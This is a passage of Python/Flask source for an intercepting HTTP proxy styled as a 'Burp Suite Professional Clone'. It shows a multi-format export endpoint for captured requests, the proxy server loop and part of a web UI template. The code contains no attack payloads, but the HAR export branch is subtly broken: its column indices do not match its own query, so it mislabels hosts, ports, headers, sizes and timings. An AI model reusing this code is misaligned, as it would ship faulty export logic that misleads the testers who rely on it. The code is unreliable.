    method_filter = request.args.get('method')
    status_filter = request.args.get('status', type=int)

    # Build query with filters
    query_params = [GLOBAL.active_project['name']]
    where_clauses = ["project = ?"]

    if start_date:
        where_clauses.append("timestamp >= ?")
        query_params.append(start_date)

    if end_date:
        where_clauses.append("timestamp <= ?")
        query_params.append(end_date)

    if method_filter:
        where_clauses.append("method = ?")
        query_params.append(method_filter.upper())

    if status_filter:
        where_clauses.append("response_code = ?")
        query_params.append(status_filter)

    where_clause = " AND ".join(where_clauses)

    try:
        with DB.cursor() as cur:
            if format == 'json':
                # Export as JSON with detailed information
                query = f"""
                    SELECT id, timestamp, method, scheme, host, port, path, query, fragment,
                           headers, body, response_code, response_headers, response_body,
                           request_size, response_size, response_time, notes, tags, comment
                    FROM requests 
                    WHERE {where_clause}
                    ORDER BY datetime(timestamp) DESC
                    {'LIMIT ?' if limit else ''}
                """

                if limit:
                    query_params.append(limit)

                rows = cur.execute(query, query_params).fetchall()

                data = []
                for row in rows:
                    # Build URL
                    url = f"{row[3]}://{row[4]}:{row[5]}{row[6]}"
                    if row[7]:
                        url += f"?{row[7]}"
                    if row[8]:
                        url += f"#{row[8]}"

                    # Prepare request/response details
                    request_data = {
                        "method": row[2],
                        "url": url,
                        "headers": json.loads(row[9]) if row[9] else [],
                        "body": base64.b64encode(row[10]).decode() if row[10] else None if row[
                                                                                               10] is not None else None,
                        "size": row[14]
                    }

                    response_data = {
                        "status_code": row[11],
                        "headers": json.loads(row[12]) if row[12] else [],
                        "body": base64.b64encode(row[13]).decode() if row[13] else None if row[
                                                                                               13] is not None else None,
                        "size": row[15],
                        "time_ms": round(row[16] * 1000, 2) if row[16] else None
                    }

                    data.append({
                        "id": row[0],
                        "timestamp": row[1],
                        "request": request_data,
                        "response": response_data,
                        "metadata": {
                            "notes": row[17] or "",
                            "tags": row[18] or "",
                            "comment": row[19] or ""
                        }
                    })

                # Create JSON export with pretty formatting
                export_data = {
                    "export_info": {
                        "generated_at": datetime.now(timezone.utc).isoformat(),
                        "project": GLOBAL.active_project['name'],
                        "format": "JSON",
                        "version": "1.0",
                        "total_records": len(data)
                    },
                    "data": data
                }

                # Return as downloadable JSON file
                response = Response(
                    json.dumps(export_data, indent=2, ensure_ascii=False),
                    mimetype="application/json",
                    headers={
                        "Content-Disposition": f"attachment; filename=burp_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                        "Cache-Control": "no-cache, no-store, must-revalidate",
                        "Pragma": "no-cache",
                        "Expires": "0"
                    }
                )
                return response

            elif format == 'csv':
                # Export as CSV
                query = f"""
                    SELECT timestamp, method, scheme, host, port, path, query,
                           response_code, request_size, response_size, response_time,
                           (SELECT COUNT(*) FROM scanner_results sr WHERE sr.request_id = requests.id) as issue_count
                    FROM requests 
                    WHERE {where_clause}
                    ORDER BY datetime(timestamp) DESC
                    {'LIMIT ?' if limit else ''}
                """

                if limit:
                    query_params.append(limit)

                rows = cur.execute(query, query_params).fetchall()

                # Create CSV in memory
                output = StringIO()
                writer = csv.writer(output)

                # Write header with additional metadata
                writer.writerow([
                    'Timestamp (UTC)', 'Method', 'Scheme', 'Host', 'Port',
                    'Path', 'Query', 'Full URL', 'Status Code',
                    'Request Size (bytes)', 'Response Size (bytes)',
                    'Response Time (ms)', 'Security Issues'
                ])

                for row in rows:
                    # Build full URL
                    full_url = f"{row[2]}://{row[3]}:{row[4]}{row[5]}"
                    if row[6]:
                        full_url += f"?{row[6]}"

                    # Format response time
                    response_time_ms = round(row[10] * 1000, 2) if row[10] else 0

                    writer.writerow([
                        row[0],  # timestamp
                        row[1],  # method
                        row[2],  # scheme
                        row[3],  # host
                        row[4],  # port
                        row[5],  # path
                        row[6] or '',  # query
                        full_url,  # full URL
                        row[7] or 0,  # status code
                        row[8] or 0,  # request size
                        row[9] or 0,  # response size
                        response_time_ms,  # response time
                        row[11] or 0  # issue count
                    ])

                csv_data = output.getvalue()

                # Return as downloadable CSV
                return Response(
                    csv_data,
                    mimetype="text/csv; charset=utf-8",
                    headers={
                        "Content-Disposition": f"attachment; filename=burp_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
                        "Cache-Control": "no-cache, no-store, must-revalidate",
                        "Pragma": "no-cache",
                        "Expires": "0"
                    }
                )

            elif format == 'har':
                # Export in HAR (HTTP Archive) format
                query = f"""
                    SELECT timestamp, method, scheme, host, port, path, query, fragment,
                           headers, body, response_code, response_headers, response_body,
                           request_size, response_size, response_time
                    FROM requests 
                    WHERE {where_clause}
                    ORDER BY datetime(timestamp) DESC
                    {'LIMIT ?' if limit else ''}
                """

                if limit:
                    query_params.append(limit)

                rows = cur.execute(query, query_params).fetchall()

                # Build HAR structure
                har_data = {
                    "log": {
                        "version": "1.2",
                        "creator": {
                            "name": "Burp Suite Professional Clone",
                            "version": "2.1",
                            "comment": "Generated by Yettie Security Testing Platform"
                        },
                        "browser": {
                            "name": "Yettie Proxy",
                            "version": "2.1",
                            "comment": "Security Testing Proxy"
                        },
                        "pages": [],
                        "entries": []
                    }
                }

                # Create entries
                for i, row in enumerate(rows):
                    # Calculate timings
                    started_date_time = datetime.fromisoformat(row[0].replace('Z', '+00:00'))

                    # Build URL
                    url = f"{row[2]}://{row[4]}:{row[5]}{row[6]}"
                    if row[7]:
                        url += f"?{row[7]}"
                    if row[8]:
                        url += f"#{row[8]}"

                    # Parse headers
                    request_headers = []
                    if row[9]:
                        for key, value in json.loads(row[9]):
                            request_headers.append({
                                "name": key,
                                "value": value
                            })

                    response_headers = []
                    if row[12]:
                        for key, value in json.loads(row[12]):
                            response_headers.append({
                                "name": key,
                                "value": value
                            })

                    # Create entry
                    entry = {
                        "startedDateTime": started_date_time.isoformat(),
                        "time": round(row[15] * 1000, 2) if row[15] else 0,
                        "request": {
                            "method": row[1],
                            "url": url,
                            "httpVersion": "HTTP/1.1",
                            "cookies": [],
                            "headers": request_headers,
                            "queryString": [],
                            "headersSize": row[14] or 0,
                            "bodySize": len(row[10]) if row[10] else 0
                        },
                        "response": {
                            "status": row[11] or 0,
                            "statusText": "OK" if row[11] and row[11] < 400 else "Error",
                            "httpVersion": "HTTP/1.1",
                            "cookies": [],
                            "headers": response_headers,
                            "redirectURL": "",
                            "headersSize": -1,
                            "bodySize": row[15] or 0,
                            "content": {
                                "size": row[15] or 0,
                                "mimeType": "text/html",
                                "text": base64.b64encode(row[13]).decode() if row[13] else "" if row[
                                                                                                     13] is not None else ""
                            }
                        },
                        "cache": {},
                        "timings": {
                            "send": 0,
                            "wait": round(row[15] * 1000, 2) if row[15] else 0,
                            "receive": 0
                        },
                        "serverIPAddress": row[3],
                        "connection": str(row[5])
                    }

                    # Add query string parameters if present
                    if row[7]:
                        params = urllib.parse.parse_qs(row[7])
                        for key, values in params.items():
                            for value in values:
                                entry["request"]["queryString"].append({
                                    "name": key,
                                    "value": value
                                })

                    har_data["log"]["entries"].append(entry)

                # Return as downloadable HAR file
                return Response(
                    json.dumps(har_data, indent=2, ensure_ascii=False),
                    mimetype="application/json",
                    headers={
                        "Content-Disposition": f"attachment; filename=burp_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.har",
                        "Cache-Control": "no-cache, no-store, must-revalidate",
                        "Pragma": "no-cache",
                        "Expires": "0"
                    }
                )

            elif format == 'xml':
                # Export as XML
                query = f"""
                    SELECT timestamp, method, scheme, host, port, path, query,
                           response_code, request_size, response_size
                    FROM requests 
                    WHERE {where_clause}
                    ORDER BY datetime(timestamp) DESC
                    {'LIMIT ?' if limit else ''}
                """

                if limit:
                    query_params.append(limit)

                rows = cur.execute(query, query_params).fetchall()

                # Create XML structure
                root = ET.Element("BurpExport")
                root.set("version", "1.0")
                root.set("generated", datetime.now(timezone.utc).isoformat())
                root.set("project", GLOBAL.active_project['name'])

                # Add metadata
                metadata = ET.SubElement(root, "Metadata")
                ET.SubElement(metadata, "TotalRecords").text = str(len(rows))
                ET.SubElement(metadata, "ExportFormat").text = "XML"

                # Add requests
                requests_elem = ET.SubElement(root, "Requests")
                for row in rows:
                    request_elem = ET.SubElement(requests_elem, "Request")

                    ET.SubElement(request_elem, "Timestamp").text = row[0]
                    ET.SubElement(request_elem, "Method").text = row[1]
                    ET.SubElement(request_elem, "Scheme").text = row[2]
                    ET.SubElement(request_elem, "Host").text = row[3]
                    ET.SubElement(request_elem, "Port").text = str(row[4])
                    ET.SubElement(request_elem, "Path").text = row[5]

                    if row[6]:
                        ET.SubElement(request_elem, "Query").text = row[6]

                    # Build URL
                    url = f"{row[2]}://{row[3]}:{row[4]}{row[5]}"
                    if row[6]:
                        url += f"?{row[6]}"
                    ET.SubElement(request_elem, "URL").text = url

                    ET.SubElement(request_elem, "StatusCode").text = str(row[7] or 0)
                    ET.SubElement(request_elem, "RequestSize").text = str(row[8] or 0)
                    ET.SubElement(request_elem, "ResponseSize").text = str(row[9] or 0)

                # Convert to pretty XML string
                xml_string = ET.tostring(root, encoding='unicode')
                dom = xml.dom.minidom.parseString(xml_string)
                pretty_xml = dom.toprettyxml()

                # Return as downloadable XML file
                return Response(
                    pretty_xml,
                    mimetype="application/xml",
                    headers={
                        "Content-Disposition": f"attachment; filename=burp_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xml",
                        "Cache-Control": "no-cache, no-store, must-revalidate",
                        "Pragma": "no-cache",
                        "Expires": "0"
                    }
                )

            elif format == 'sql':
                # Export as SQL insert statements (useful for migration)
                query = f"""
                    SELECT id, timestamp, method, scheme, host, port, path, query, fragment,
                           headers, body, response_code, response_headers, response_body,
                           response_time, request_size, response_size, project
                    FROM requests 
                    WHERE {where_clause}
                    ORDER BY datetime(timestamp) DESC
                    {'LIMIT ?' if limit else ''}
                """

                if limit:
                    query_params.append(limit)

                rows = cur.execute(query, query_params).fetchall()

                sql_output = []
                sql_output.append("-- Burp Suite Professional Clone Export")
                sql_output.append(f"-- Generated: {datetime.now(timezone.utc).isoformat()}")
                sql_output.append(f"-- Project: {GLOBAL.active_project['name']}")
                sql_output.append(f"-- Total Records: {len(rows)}")
                sql_output.append("")
                sql_output.append("BEGIN TRANSACTION;")
                sql_output.append("")

                for row in rows:
                    # Create SQL insert statement
                    columns = [
                        'id', 'timestamp', 'method', 'scheme', 'host', 'port',
                        'path', 'query', 'fragment', 'headers', 'body',
                        'response_code', 'response_headers', 'response_body',
                        'response_time', 'request_size', 'response_size', 'project'
                    ]

                    values = []
                    for i, val in enumerate(row):
                        if val is None:
                            values.append("NULL")
                        elif i in [9, 12]:  # headers columns (JSON)
                            values.append(f"'{json.dumps(json.loads(val) if val else [])}'")
                        elif i in [10, 13]:  # body columns (BLOB)
                            if val:
                                # Encode as hex for SQL
                                hex_val = val.hex()
                                values.append(f"X'{hex_val}'")
                            else:
                                values.append("NULL")
                        elif isinstance(val, str):
                            # Escape single quotes
                            escaped = val.replace("'", "''")
                            values.append(f"'{escaped}'")
                        else:
                            values.append(str(val))

                    sql = f"INSERT INTO requests ({', '.join(columns)}) VALUES ({', '.join(values)});"
                    sql_output.append(sql)

                sql_output.append("")
                sql_output.append("COMMIT;")

                sql_data = "\n".join(sql_output)

                # Return as downloadable SQL file
                return Response(
                    sql_data,
                    mimetype="application/sql",
                    headers={
                        "Content-Disposition": f"attachment; filename=burp_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sql",
                        "Cache-Control": "no-cache, no-store, must-revalidate",
                        "Pragma": "no-cache",
                        "Expires": "0"
                    }
                )

            else:
                return jsonify({
                    "error": "Unsupported format",
                    "supported_formats": ["json", "csv", "har", "xml", "sql"],
                    "usage": "/api/export/<format>?limit=100&start_date=2024-01-01&end_date=2024-12-31&method=GET&status=200"
                }), 400

    except Exception as e:
        print(f"Export error: {e}")
        return jsonify({
            "error": "Export failed",
            "message": str(e)
        }), 500


# ================= START PROXY =================
def start_proxy_server():
    """Start the proxy server"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.settimeout(1)
    server.bind(("0.0.0.0", PROXY_PORT))
    server.listen(200)

    print(f"[+] Burp Suite Professional Clone")
    print(f"[+] Proxy listening on 0.0.0.0:{PROXY_PORT}")
    print(f"[+] Web UI: http://127.0.0.1:{UI_PORT}")
    if CA_CERT.exists():
        print(f"[+] CA Certificate: {CA_CERT.resolve()}")
    else:
        print(f"[+] CA Certificate: {os.path.abspath('burp_ca.crt')}")
    print(f"[+] Press Ctrl+C to stop")

    try:
        while not STOP_EVENT.is_set():
            try:
                client, addr = server.accept()
                threading.Thread(
                    target=proxy_engine.handle_client,
                    args=(client,),
                    daemon=True
                ).start()
            except socket.timeout:
                continue
    except KeyboardInterrupt:
        print("\n[+] Shutting down...")
    finally:
        server.close()
        STOP_EVENT.set()


# ================= ADVANCED UI TEMPLATE =================
# This is a comprehensive, modern light theme UI template
# Due to length constraints, I'm providing a simplified version
# The full template would be much longer with all features

ADVANCED_UI_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Burp Suite Professional - Advanced Security Testing Platform</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            scrollbar-width: thin;
            scrollbar-color: var(--scrollbar-thumb) var(--scrollbar-track);
        }

        :root {
            --primary: #4a6ee0;
            --primary-dark: #3a5acf;
            --secondary: #6c757d;
            --success: #28a745;
            --warning: #ffc107;
            --danger: #dc3545;
            --info: #17a2b8;
            --light: #f8f9fa;
            --dark: #343a40;
            --white: #ffffff;
            --gray-100: #f8f9fa;
            --gray-200: #e9ecef;
            --gray-300: #dee2e6;
            --gray-400: #ced4da;
            --gray-500: #adb5bd;
            --gray-600: #6c757d;
            --gray-700: #495057;
            --gray-800: #343a40;
            --gray-900: #212529;
            --border-radius: 6px;
            --box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            --transition: all 0.3s ease;
            --scrollbar-track: transparent;
            --scrollbar-thumb: rgba(120, 120, 120, 0.5);
            --scrollbar-thumb-hover: rgba(120, 120, 120, 0.85);
            --scrollbar-width: 8px;
        }
        
        /* Width */
        ::-webkit-scrollbar {
            width: var(--scrollbar-width);
            height: var(--scrollbar-width);
        }

        /* Track */
        ::-webkit-scrollbar-track {
            background: var(--scrollbar-track);
        }

        /* Thumb */
        ::-webkit-scrollbar-thumb {
            background-color: var(--scrollbar-thumb);
            border-radius: 999px;
            border: 2px solid transparent;
            background-clip: content-box;
        }

        /* Hover */
        ::-webkit-scrollbar-thumb:hover {
             background-color: var(--scrollbar-thumb-hover);
        }


        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: var(--gray-800);
            min-height: 100vh;
        }

        /* Main Layout */
        .app-container {
            display: flex;
            height: 100vh;
            overflow: hidden;
        }

        /* Sidebar */
        .sidebar {
            width: 280px;
            background: var(--white);
            border-right: 1px solid var(--gray-300);
            display: flex;
            overflow-y : auto;
            flex-direction: column;
            box-shadow: 2px 0 10px rgba(0,0,0,0.05);
            z-index: 100;
        }

        .logo {
            padding: 20px;
            border-bottom: 1px solid var(--gray-300);
            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
            color: white;
        }

        .logo h1 {
            font-size: 22px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .logo h1 i {
            font-size: 24px;
        }

        .logo .version {
            font-size: 12px;
            opacity: 0.8;
            margin-top: 5px;
        }

        .nav-section {
            padding: 20px 0;
            border-bottom: 1px solid var(--gray-200);
        }

        .nav-section:last-child {
            border-bottom: none;
        }

        .nav-title {
            padding: 0 20px 10px;
            color: var(--gray-600);
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .nav-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 20px;
            color: var(--gray-700);
            text-decoration: none;
            transition: var(--transition);
            cursor: pointer;
            border-left: 3px solid transparent;
        }

        .nav-item:hover {
            background: var(--gray-100);
            color: var(--primary);
        }

        .nav-item.active {
            background: var(--gray-100);
            color: var(--primary);
            border-left-color: var(--primary);
            font-weight: 500;
        }

        .nav-item i {
            width: 20px;
            text-align: center;
            font-size: 16px;
        }

        /* Main Content */
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            background: var(--gray-100);
        }

        .top-bar {
            padding: 15px 20px;
            background: var(--white);
            border-bottom: 1px solid var(--gray-300);
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        }

        .top-bar-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .top-bar-right {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .status-badge {
            padding: 6px 12px;
            background: var(--success);
            color: white;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .status-badge i {
            font-size: 10px;
        }

        .status-badge.danger {
            background: var(--danger);
        }

        .status-badge.warning {
            background: var(--warning);
            color: var(--dark);
        }

        .btn {
            padding: 8px 16px;
            border: none;
            border-radius: var(--border-radius);
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: var(--transition);
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .btn-primary {
            background: var(--primary);
            color: white;
        }

        .btn-primary:hover {
            background: var(--primary-dark);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(74, 110, 224, 0.3);
        }

        .btn-secondary {
            background: var(--gray-200);
            color: var(--gray-700);
        }

        .btn-secondary:hover {
            background: var(--gray-300);
        }

        .btn-success {
            background: var(--success);
            color: white;
        }

        .btn-danger {
            background: var(--danger);
            color: white;
        }

        .btn-sm {
            padding: 6px 12px;
            font-size: 13px;
        }

        /* Content Area */
        .content-area {
            flex: 1;
            padding: 20px;
            overflow-y: auto;
            background: var(--gray-100);
        }

        /* Dashboard */
        .dashboard-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: var(--white);
            padding: 20px;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            display: flex;
            align-items: center;
            gap: 20px;
            transition: var(--transition);
        }

        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }

        .stat-icon {
            width: 60px;
            height: 60px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: white;
        }

        .stat-icon.primary {
            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
        }

        .stat-icon.success {
            background: linear-gradient(135deg, var(--success) 0%, #1e7e34 100%);
        }

        .stat-icon.warning {
            background: linear-gradient(135deg, var(--warning) 0%, #e0a800 100%);
        }

        .stat-icon.danger {
            background: linear-gradient(135deg, var(--danger) 0%, #bd2130 100%);
        }

        .stat-content {
            flex: 1;
        }

        .stat-value {
            font-size: 28px;
            font-weight: 700;
            color: var(--gray-900);
            margin-bottom: 5px;
        }

        .stat-label {
            font-size: 14px;
            color: var(--gray-600);
        }

        /* Charts */
        .chart-container {
            background: var(--white);
            border-radius: var(--border-radius);
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: var(--box-shadow);
        }

        .chart-title {
            font-size: 18px;
            font-weight: 600;
            color: var(--gray-900);
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        /* Request List */
        .request-list {
            background: var(--white);
            border-radius: var(--border-radius);
            overflow: hidden;
            box-shadow: var(--box-shadow);
        }

        .list-header {
            padding: 15px 20px;
            background: var(--gray-100);
            border-bottom: 1px solid var(--gray-300);
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .list-title {
            font-size: 16px;
            font-weight: 600;
            color: var(--gray-900);
        }

        .list-filters {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .filter-input {
            padding: 8px 12px;
            border: 1px solid var(--gray-300);
            border-radius: var(--border-radius);
            font-size: 14px;
            width: 200px;
        }

        .filter-input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(74, 110, 224, 0.1);
        }

        .request-item {
            padding: 15px 20px;
            border-bottom: 1px solid var(--gray-200);
            display: flex;
            align-items: center;
            gap: 15px;
            transition: var(--transition);
            cursor: pointer;
        }

        .request-item:hover {
            background: var(--gray-50);
        }

        .request-item.selected {
            background: rgba(74, 110, 224, 0.05);
            border-left: 3px solid var(--primary);
        }

        .method-badge {
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            min-width: 60px;
            text-align: center;
        }

        .method-badge.get {
            background: #d1ecf1;
            color: #0c5460;
        }

        .method-badge.post {
            background: #d4edda;
            color: #155724;
        }

        .method-badge.put {
            background: #fff3cd;
            color: #856404;
        }

        .method-badge.delete {
            background: #f8d7da;
            color: #721c24;
        }

        .request-details {
            flex: 1;
            min-width: 0;
        }

        .request-url {
            font-size: 14px;
            color: var(--gray-900);
            margin-bottom: 5px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .request-meta {
            display: flex;
            align-items: center;
            gap: 15px;
            font-size: 12px;
            color: var(--gray-600);
        }

        .status-code {
            font-weight: 600;
        }

        .status-code.success {
            color: var(--success);
        }

        .status-code.error {
            color: var(--danger);
        }

        .status-code.warning {
            color: var(--warning);
        }

        .request-actions {
            display: flex;
            gap: 10px;
            opacity: 0;
            transition: var(--transition);
        }

        .request-item:hover .request-actions {
            opacity: 1;
        }

        .action-btn {
            width: 32px;
            height: 32px;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: var(--gray-200);
            color: var(--gray-700);
            border: none;
            cursor: pointer;
            transition: var(--transition);
        }

        .action-btn:hover {
            background: var(--gray-300);
            color: var(--primary);
        }

        /* Tabs */
        .tabs {
            display: flex;
            border-bottom: 1px solid var(--gray-300);
            margin-bottom: 20px;
        }

        .tab {
            padding: 12px 24px;
            border: none;
            background: none;
            color: var(--gray-600);
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: var(--transition);
            border-bottom: 2px solid transparent;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .tab:hover {
            color: var(--primary);
        }

        .tab.active {
            color: var(--primary);
            border-bottom-color: var(--primary);
        }

        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }

        .modal.show {
            display: flex;
        }

        .modal-content {
            background: var(--white);
            border-radius: var(--border-radius);
            width: 90%;
            max-width: 800px;
            max-height: 90vh;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }

        .modal-header {
            padding: 20px;
            border-bottom: 1px solid var(--gray-300);
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .modal-title {
            font-size: 20px;
            font-weight: 600;
            color: var(--gray-900);
        }

        .modal-close {
            background: none;
            border: none;
            font-size: 24px;
            color: var(--gray-600);
            cursor: pointer;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 4px;
            transition: var(--transition);
        }

        .modal-close:hover {
            background: var(--gray-200);
            color: var(--danger);
        }

        .modal-body {
            padding: 20px;
            max-height: 60vh;
            overflow-y: auto;
        }

        .modal-footer {
            padding: 20px;
            border-top: 1px solid var(--gray-300);
            display: flex;
            justify-content: flex-end;
            gap: 10px;
        }

        /* Forms */
        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--gray-700);
        }

        .form-control {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid var(--gray-300);
            border-radius: var(--border-radius);
            font-size: 14px;
            transition: var(--transition);
        }

        .form-control:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(74, 110, 224, 0.1);
        }

        .form-textarea {
            min-height: 120px;
            resize: vertical;
            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
            font-size: 13px;
        }

        /* Code Editor */
        .code-editor {
            background: var(--gray-900);
            color: var(--gray-100);
            border-radius: var(--border-radius);
            overflow: hidden;
            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
        }

        .code-toolbar {
            padding: 10px 15px;
            background: var(--gray-800);
            border-bottom: 1px solid var(--gray-700);
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .code-content {
            padding: 15px;
            max-height: 400px;
            overflow-y: auto;
        }

        .code-line {
            margin-bottom: 5px;
            font-size: 13px;
            line-height: 1.5;
        }

        .code-line.highlight {
            background: rgba(255, 255, 0, 0.1);
        }

        /* Severity Badges */
        .severity-badge {
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
        }

        .severity-critical {
            background: linear-gradient(135deg, #721c24 0%, #bd2130 100%);
            color: white;
        }

        .severity-high {
            background: linear-gradient(135deg, #856404 0%, #d39e00 100%);
            color: white;
        }

        .severity-medium {
            background: linear-gradient(135deg, #0c5460 0%, #117a8b 100%);
            color: white;
        }

        .severity-low {
            background: linear-gradient(135deg, #155724 0%, #28a745 100%);
            color: white;
        }

        .severity-info {
            background: linear-gradient(135deg, #004085 0%, #0069d9 100%);
            color: white;
        }

        /* Loading Spinner */
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid var(--gray-300);
            border-top-color: var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Responsive */
        @media (max-width: 1200px) {
            .sidebar {
                width: 240px;
            }
        }

        @media (max-width: 992px) {
            .sidebar {
                width: 60px;
            }

            .nav-item span {
                display: none;
            }

            .nav-title {
                display: none;
            }

            .logo h1 span {
                display: none;
            }
        }

        @media (max-width: 768px) {
            .app-container {
                flex-direction: column;
            }

            .sidebar {
                width: 100%;
                height: 60px;
                flex-direction: row;
                overflow-x: auto;
            }

            .logo {
                width: 200px;
                border-right: 1px solid var(--gray-300);
            }

            .nav-section {
                padding: 0;
                border-bottom: none;
                display: flex;
                flex: 1;
            }

            .nav-item {
                padding: 0 20px;
                border-left: none;
                border-bottom: 3px solid transparent;
            }

            .nav-item.active {
                border-left: none;
                border-bottom-color: var(--primary);
            }
        }
    </style>
</head>
<body>
    <div class="app-container">
        <!-- Sidebar -->
        <div class="sidebar">
            <div class="logo">
                <h1><i class="fas fa-shield-alt"></i> Burp Suite Pro</h1>
                <div class="version">Professional Edition v2.1</div>
            </div>

            <div class="nav-section">
                <div class="nav-title">Core Tools</div>
                <a class="nav-item active" onclick="switchTab('dashboard')">
                    <i class="fas fa-tachometer-alt"></i>
                    <span>Dashboard</span>
                </a>
                <a class="nav-item" onclick="switchTab('target')">
                    <i class="fas fa-crosshairs"></i>
                    <span>Target</span>
                </a>
                <a class="nav-item" onclick="switchTab('proxy')">
                    <i class="fas fa-exchange-alt"></i>
                    <span>Proxy</span>
                </a>
                <a class="nav-item" onclick="switchTab('intruder')">
                    <i class="fas fa-fighter-jet"></i>
                    <span>Intruder</span>
                </a>
                <a class="nav-item" onclick="switchTab('repeater')">
                    <i class="fas fa-redo"></i>
                    <span>Repeater</span>
                </a>
                <a class="nav-item" onclick="switchTab('scanner')">
                    <i class="fas fa-search"></i>
                    <span>Scanner</span>
                </a>
            </div>

            <div class="nav-section">
                <div class="nav-title">Advanced Tools</div>
                <a class="nav-item" onclick="switchTab('sequencer')">
                    <i class="fas fa-random"></i>
                    <span>Sequencer</span>
                </a>
                <a class="nav-item" onclick="switchTab('decoder')">
                    <i class="fas fa-code"></i>
                    <span>Decoder</span>
                </a>
                <a class="nav-item" onclick="switchTab('comparer')">
                    <i class="fas fa-not-equal"></i>
                    <span>Comparer</span>
                </a>
                <a class="nav-item" onclick="switchTab('extender')">
                    <i class="fas fa-puzzle-piece"></i>
                    <span>Extender</span>
                </a>
                <a class="nav-item" onclick="switchTab('project')">
                    <i class="fas fa-folder"></i>
                    <span>Project</span>
                </a>
            </div>

            <div class="nav-section">
                <div class="nav-title">User</div>
                <a class="nav-item" onclick="switchTab('settings')">
                    <i class="fas fa-cog"></i>
                    <span>Settings</span>
                </a>
                <a class="nav-item" onclick="showHelp()">
                    <i class="fas fa-question-circle"></i>
                    <span>Help</span>
                </a>
            </div>
        </div>

        <!-- Main Content -->
        <div class="main-content">
            <!-- Top Bar -->
            <div class="top-bar">
                <div class="top-bar-left">
                    <div class="status-badge" id="proxyStatus">
                        <i class="fas fa-circle"></i>
                        <span>Proxy: Running</span>
                    </div>
                    <div class="status-badge" id="projectStatus">
                        <i class="fas fa-folder"></i>
                        <span>Project: Default</span>
                    </div>
                    <div class="status-badge" id="issueCount">
                        <i class="fas fa-exclamation-triangle"></i>
                        <span>Issues: 0</span>
                    </div>
                </div>

                <div class="top-bar-right">
                    <button class="btn btn-secondary btn-sm" onclick="toggleIntercept()">
                        <i class="fas fa-pause"></i>
                        <span>Intercept: On</span>
                    </button>
                    <button class="btn btn-primary btn-sm" onclick="exportData()">
                        <i class="fas fa-download"></i>
                        <span>Export</span>
                    </button>
                    <button class="btn btn-success btn-sm" onclick="newScan()">
                        <i class="fas fa-search"></i>
                        <span>New Scan</span>
                    </button>
                </div>
            </div>

            <!-- Content Area -->
